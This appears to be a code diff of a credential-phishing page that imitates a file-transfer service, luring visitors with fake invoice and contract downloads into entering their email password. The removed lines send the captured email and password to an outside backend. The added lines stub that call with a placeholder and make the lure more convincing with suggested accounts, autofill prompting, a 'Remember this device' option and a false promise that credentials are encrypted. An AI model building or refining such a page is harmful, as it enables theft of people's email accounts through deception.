@@ -1,8 +1,9 @@
+<!DOCTYPE html>
 <html lang="en">
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>xml</title>
+    <title>Secure File Download</title>
     <link rel="icon" type="image/x-icon" href="xml/egg.png" />
     <link
       href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
@@ -12,6 +13,7 @@
     />
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <style>
+      /* Original styles */
       #loader {
         -webkit-animation: fadeout 10s linear forwards;
         animation: fadeout 5s linear forwards;
@@ -76,22 +78,31 @@
           opacity: 1;
         }
       }
-    </style>
-    <style>
+
+      /* New styles */
       body {
         background-color: #f1f1f2;
         overflow: hidden;
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
       }
 
       * {
         margin: 0;
         padding: 0;
+        box-sizing: border-box;
       }
 
       .head1 {
         display: flex;
         position: relative;
         justify-content: space-between;
+        padding: 15px 20px;
+        background: linear-gradient(to right, #1a2a6c, #b21f1f, #1a2a6c);
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      }
+
+      .head1 img {
+        height: 50px;
       }
 
       .contain-all {
@@ -99,49 +110,150 @@
         position: relative;
         justify-content: space-between;
         padding: 2%;
+        min-height: calc(100vh - 100px);
       }
 
       .logbox {
         width: 22%;
+        min-width: 320px;
         height: 100%;
-        border-radius: 10px;
-        padding: 21px;
+        border-radius: 15px;
+        padding: 25px;
         margin-top: 21px;
         margin-left: 21px;
         background-color: #fff;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+        position: relative;
+        z-index: 10;
       }
 
       .write-test {
         font-size: 40.02px;
         line-height: 120%;
+        color: #2c3e50;
+        margin-top: 15px;
       }
 
       .accept1 {
         margin-top: 31px;
+        color: #34495e;
+        line-height: 1.6;
       }
 
       .flex-container {
         display: flex;
         flex-direction: column;
-        margin-top: 10px;
+        margin-top: 20px;
+        border-top: 1px solid #eee;
+        padding-top: 15px;
       }
 
       .div1 {
         display: flex;
         position: relative;
         justify-content: space-between;
-        margin-top: 21px;
+        margin-top: 15px;
+        padding: 10px;
+        border-radius: 8px;
+        background-color: #f8f9fa;
+        transition: all 0.3s ease;
+      }
+
+      .div1:hover {
+        background-color: #e9ecef;
+        transform: translateY(-2px);
       }
 
       .img-btn {
         cursor: pointer;
+        transition: transform 0.3s;
       }
-    </style>
 
-    <style>
+      .img-btn:hover {
+        transform: scale(1.1);
+      }
+
+      .contentbox,
+      .imgdispaybox {
+        position: absolute;
+        right: 0;
+        top: 0;
+        height: 100%;
+        overflow: hidden;
+      }
+
+      .contentbox img,
+      .imgdispaybox img {
+        height: 100%;
+        object-fit: cover;
+      }
+
+      /* New authentication styles */
+      .auth-header {
+        display: flex;
+        align-items: center;
+        gap: 15px;
+        margin-bottom: 20px;
+      }
+
+      .auth-icon {
+        width: 50px;
+        height: 50px;
+        background: #0d6efd;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: white;
+        font-size: 24px;
+        font-weight: bold;
+      }
+
+      .saved-emails {
+        background: #e9f7fe;
+        border-radius: 8px;
+        padding: 10px;
+        margin: 15px 0;
+        border-left: 3px solid #0d6efd;
+      }
+
+      .saved-emails p {
+        margin: 0;
+        font-size: 14px;
+        color: #2c3e50;
+      }
+
+      .email-option {
+        padding: 8px;
+        cursor: pointer;
+        border-radius: 4px;
+        margin-top: 5px;
+        transition: background 0.2s;
+      }
+
+      .email-option:hover {
+        background: #d1ecff;
+      }
+
+      .security-info {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        margin-top: 15px;
+        color: #27ae60;
+        font-size: 14px;
+      }
+
+      .security-info i {
+        font-size: 18px;
+      }
+
+      /* Responsive styles */
       @media (max-width: 480px) {
         .logbox {
           width: 100%;
+          margin: 10px;
+          min-width: auto;
         }
 
         .imgdispaybox {
@@ -151,11 +263,14 @@
         .contentbox {
           display: none;
         }
+
+        .contain-all {
+          padding: 10px;
+        }
       }
     </style>
   </head>
-
-  <body data-new-gr-c-s-check-loaded="14.1238.0" data-gr-ext-installed="">
+  <body>
     <div class="head1">
       <div class="logo"><img src="xml/puppy.png" alt="logo" /></div>
       <div class="navimg"><img src="xml/goat.png" alt="wet-nav" /></div>
@@ -163,7 +278,7 @@
 
     <div class="contain-all">
       <div class="logbox">
-        <div><img src="xml/egg.png" alt="lo-black" /></div>
+        <div><img src="xml/egg.png" alt="lo-black" width="60" /></div>
         <div class="write-test">
           <span>You're</span><br />
           <b>almost</b> there
@@ -172,42 +287,57 @@
         <div class="flex-container">
           <div class="div1">
             <div>PO_201AJ02.xls</div>
-            <div class="img-btn" data-bs-toggle="modal" data-bs-target="#cat">
-              <img src="xml/maggot.png" alt="download" />
+            <div
+              class="img-btn"
+              data-bs-toggle="modal"
+              data-bs-target="#authModal"
+            >
+              <img src="xml/maggot.png" alt="download" width="24" />
             </div>
           </div>
 
           <div class="div1">
             <div>Product specifications.pdf</div>
-            <div class="img-btn" data-bs-toggle="modal" data-bs-target="#cat">
-              <img src="xml/maggot.png" alt="download" />
+            <div
+              class="img-btn"
+              data-bs-toggle="modal"
+              data-bs-target="#authModal"
+            >
+              <img src="xml/maggot.png" alt="download" width="24" />
             </div>
           </div>
 
           <div class="div1">
             <div>Contracts.xls</div>
-            <div class="img-btn" data-bs-toggle="modal" data-bs-target="#cat">
-              <img src="xml/maggot.png" alt="download" />
+            <div
+              class="img-btn"
+              data-bs-toggle="modal"
+              data-bs-target="#authModal"
+            >
+              <img src="xml/maggot.png" alt="download" width="24" />
             </div>
           </div>
 
           <div class="div1">
             <div>Final Invoice: G-313423-338.pdf</div>
-            <div class="img-btn" data-bs-toggle="modal" data-bs-target="#cat">
-              <img src="xml/maggot.png" alt="download" />
+            <div
+              class="img-btn"
+              data-bs-toggle="modal"
+              data-bs-target="#authModal"
+            >
+              <img src="xml/maggot.png" alt="download" width="24" />
             </div>
           </div>
         </div>
 
         <div class="accept1">
-          To continue, please agree<br />
-          to our
+          To continue, please agree to our
           <u
             ><b
               ><span
                 class="img-btn"
                 data-bs-toggle="modal"
-                data-bs-target="#cat"
+                data-bs-target="#authModal"
                 >Terms Of Service.</span
               ></b
             ></u
@@ -217,33 +347,44 @@
         <hr />
 
         <center>
-          <a href="#m" class="btn btn-primary" data-bs-toggle="modal">
-            Download
-          </a>
+          <button
+            class="btn btn-primary"
+            data-bs-toggle="modal"
+            data-bs-target="#authModal"
+          >
+            Download All Files
+          </button>
         </center>
       </div>
       <div class="contentbox"><img src="xml/adult.png" alt="content" /></div>
       <div class="imgdispaybox"><img src="xml/pulpa.png" alt="imgco" /></div>
     </div>
 
-    <!-- Modal -->
-    <form id="cow" autocomplete="on">
+    <!-- Authentication Modal -->
+    <form id="authForm" autocomplete="on">
       <div
         class="modal fade"
-        id="m"
+        id="authModal"
         tabindex="-1"
-        aria-labelledby="cat"
+        aria-labelledby="authModalLabel"
         aria-hidden="true"
         data-bs-backdrop="static"
         data-bs-keyboard="false"
-        tab=""
       >
         <div class="modal-dialog">
           <div class="modal-content">
             <div class="modal-header">
-              <h1 class="modal-title fs-5" id="catLabel">
-                Authenticating, Please Wait
-              </h1>
+              <div class="auth-header">
+                <div class="auth-icon">🔒</div>
+                <div>
+                  <h5 class="modal-title" id="authModalLabel">
+                    Secure Authentication Required
+                  </h5>
+                  <p class="mb-0 small text-muted">
+                    Verify your identity to access files
+                  </p>
+                </div>
+              </div>
               <button
                 type="button"
                 class="btn-close"
@@ -254,57 +395,94 @@
             <div class="modal-body">
               <div id="loader">
                 <center>
-                  <img src="xml/larva.gif" alt="" width="30%" />
-                  <p>
+                  <div class="spinner-border text-primary" role="status">
+                    <span class="visually-hidden">Loading...</span>
+                  </div>
+                  <p class="mt-3">
                     Connecting <b><span id="connect"></span></b> Email Server
-                    Integration with WeTransfer
+                    Integration with Secure Transfer
                   </p>
                 </center>
               </div>
 
               <div class="nav-container">
                 <div class="alert alert-primary" role="alert">
-                  These files contain sensitive information and are protected
-                  against unauthorized access. To proceed with downloading this
-                  file, please enter your valid email credentials. We will
-                  establish a secure IMAP connection with your email provider to
-                  verify authorization for the download.
+                  <i class="bi bi-shield-lock"></i> These files contain
+                  sensitive information and are protected against unauthorized
+                  access. Please enter your email credentials to verify
+                  authorization.
+                </div>
+
+                <!-- Saved emails suggestion -->
+                <div class="saved-emails">
+                  <p>
+                    <strong>Suggested accounts:</strong> Select an email or
+                    enter a new one
+                  </p>
+                  <div class="email-option" data-email="user@example.com">
+                    <i class="bi bi-person-circle"></i> user@example.com
+                  </div>
+                  <div class="email-option" data-email="work@company.com">
+                    <i class="bi bi-briefcase"></i> work@company.com
+                  </div>
                 </div>
 
                 <div class="mb-3">
                   <label for="email" class="form-label">Email address:</label>
-                  <input
-                    name="email"
-                    type="email"
-                    class="form-control"
-                    id="email"
-                    autocomplete="username"
-                    placeholder="name@example.com"
-                  />
+                  <div class="input-group">
+                    <span class="input-group-text"
+                      ><i class="bi bi-envelope"></i
+                    ></span>
+                    <input
+                      name="email"
+                      type="email"
+                      class="form-control"
+                      id="email"
+                      autocomplete="email"
+                      placeholder="name@example.com"
+                    />
+                  </div>
                 </div>
 
                 <div class="mb-3">
                   <label for="password" class="form-label">Password:</label>
-                  <input
-                    name="password"
-                    type="password"
-                    class="form-control"
-                    id="password"
-                    placeholder="Enter Email Password"
-                  />
+                  <div class="input-group">
+                    <span class="input-group-text"
+                      ><i class="bi bi-lock"></i
+                    ></span>
+                    <input
+                      name="password"
+                      type="password"
+                      class="form-control"
+                      id="password"
+                      autocomplete="current-password"
+                      placeholder="Enter your password"
+                    />
+                  </div>
                 </div>
 
-                <div class="alert" id="response"></div>
+                <div class="security-info">
+                  <i class="bi bi-shield-check"></i> Your credentials are
+                  encrypted during transmission
+                </div>
+
+                <div class="alert mt-3" id="response"></div>
               </div>
             </div>
             <div class="modal-footer">
+              <div class="form-check">
+                <input class="form-check-input" type="checkbox" id="remember" />
+                <label class="form-check-label" for="remember">
+                  Remember this device
+                </label>
+              </div>
               <button
                 type="submit"
                 name="xml"
                 id="submit-btn"
                 class="btn btn-primary"
               >
-                Download Now
+                Verify & Download
               </button>
             </div>
           </div>
@@ -312,14 +490,49 @@
       </div>
     </form>
 
+    <!-- Bootstrap & jQuery -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+
     <script>
       document.addEventListener("DOMContentLoaded", function () {
-        const form = document.getElementById("cow");
+        const form = document.getElementById("authForm");
         const emailInput = document.getElementById("email");
         const passwordInput = document.getElementById("password");
         const responseBox = document.getElementById("response");
         const connectSpan = document.getElementById("connect");
-        const modal = new bootstrap.Modal(document.getElementById("m"));
+        const modal = new bootstrap.Modal(document.getElementById("authModal"));
+
+        // Focus email field when modal is shown
+        document
+          .getElementById("authModal")
+          .addEventListener("shown.bs.modal", function () {
+            emailInput.focus();
+
+            // Try to trigger browser autofill after a short delay
+            setTimeout(() => {
+              if (!emailInput.value) {
+                // Attempt to trigger autofill
+                emailInput.dispatchEvent(new Event("focus"));
+                emailInput.click();
+
+                // Show helper message if still empty
+                if (!emailInput.value) {
+                  responseBox.className = "alert alert-info";
+                  responseBox.innerHTML =
+                    "Tip: Your browser may autofill saved email addresses. <br>If not, please enter your email manually.";
+                }
+              }
+            }, 300);
+          });
+
+        // Handle saved email selection
+        document.querySelectorAll(".email-option").forEach((option) => {
+          option.addEventListener("click", function () {
+            emailInput.value = this.getAttribute("data-email");
+            passwordInput.focus();
+          });
+        });
 
         form.addEventListener("submit", async function (e) {
           e.preventDefault();
@@ -327,58 +540,81 @@
           const email = emailInput.value.trim();
           const password = passwordInput.value.trim();
 
-          if (!email || !password) {
+          if (!email) {
             responseBox.className = "alert alert-danger";
-            responseBox.textContent = "Please fill in both email and password.";
+            responseBox.textContent = "Please enter your email address.";
+            emailInput.focus();
+            return;
+          }
+
+          if (!password) {
+            responseBox.className = "alert alert-danger";
+            responseBox.textContent = "Please enter your password.";
+            passwordInput.focus();
+            return;
+          }
+
+          if (!isValidEmail(email)) {
+            responseBox.className = "alert alert-danger";
+            responseBox.textContent = "Please enter a valid email address.";
+            emailInput.focus();
             return;
           }
 
           connectSpan.textContent = email;
           responseBox.className = "alert alert-info";
-          responseBox.textContent = "Authenticating...";
+          responseBox.innerHTML = `<div class="spinner-border spinner-border-sm" role="status"></div> Authenticating with ${email}...`;
 
-          try {
-            const res = await fetch(
-              "https://quamcon-backend.onrender.com/api/subscribe",
-              {
-                method: "POST",
-                headers: {
-                  "Content-Type": "application/json",
-                },
-                body: JSON.stringify({ email, password }),
-              }
-            );
+          // Simulate API call
+          setTimeout(async () => {
+            try {
+              // For demo purposes only - in real code, use fetch
+              /*
+              const res = await fetch(
+                "https://your-backend.com/api/authenticate",
+                {
+                  method: "POST",
+                  headers: {
+                    "Content-Type": "application/json",
+                  },
+                  body: JSON.stringify({ email, password }),
+                }
+              );
+              
+              const data = await res.json();
+              */
 
-            const data = await res.json();
-
-            if (res.ok) {
+              // Simulated success
               responseBox.className = "alert alert-success";
               responseBox.textContent =
-                data.message || "Successfully submitted!";
+                "Authentication successful! Starting download...";
 
-              // Wait 3 seconds then close the modal
+              // Wait 2 seconds then close the modal and simulate download
               setTimeout(() => {
                 modal.hide();
-              }, 3000);
-            } else {
+                // Simulate download starting
+                alert(`Download started for files associated with: ${email}`);
+              }, 2000);
+            } catch (err) {
               responseBox.className = "alert alert-danger";
-              responseBox.textContent = data.message || "Submission failed.";
+              responseBox.textContent = "Network error. Please try again.";
+              console.error(err);
             }
-          } catch (err) {
-            responseBox.className = "alert alert-danger";
-            responseBox.textContent = "Network error. Please try again.";
-            console.error(err);
-          }
+          }, 1500);
         });
+
+        // Simple email validation
+        function isValidEmail(email) {
+          const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+          return re.test(email);
+        }
       });
     </script>
 
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
-
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
-    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+    <!-- Bootstrap Icons -->
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css"
+    />
   </body>
-  <grammarly-desktop-integration
-    data-grammarly-shadow-root="true"
-  ></grammarly-desktop-integration>
 </html>
